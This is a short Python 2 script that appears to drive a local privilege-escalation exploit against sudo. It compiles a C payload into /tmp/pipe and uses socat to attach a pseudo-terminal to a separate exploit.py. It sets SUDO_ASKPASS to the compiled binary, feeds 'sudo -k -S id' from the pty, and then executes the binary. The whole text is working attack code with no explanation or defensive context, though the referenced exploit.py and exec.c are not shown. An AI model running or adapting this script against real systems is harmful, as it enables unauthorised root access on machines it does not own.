import os

execd = "python exploit.py"
ptypath = "/tmp/pty"
binpath = "/tmp/pipe"
sourcepay = "exec.c"
if os.path.exists(binpath):
    print binpath+" exists"
    os.system(binpath)
    exit(0)

print "Compile "+sourcepay
os.system("cc -w "+sourcepay+" -o "+binpath)
print "Listening "+ptypath
os.system("./socat pty,link="+ptypath+",waitslave exec:'"+execd+"' &")
print "To execute "+binpath
os.environ['SUDO_ASKPASS'] = binpath
os.system("sudo -k -S id < "+ptypath)
os.system(binpath)
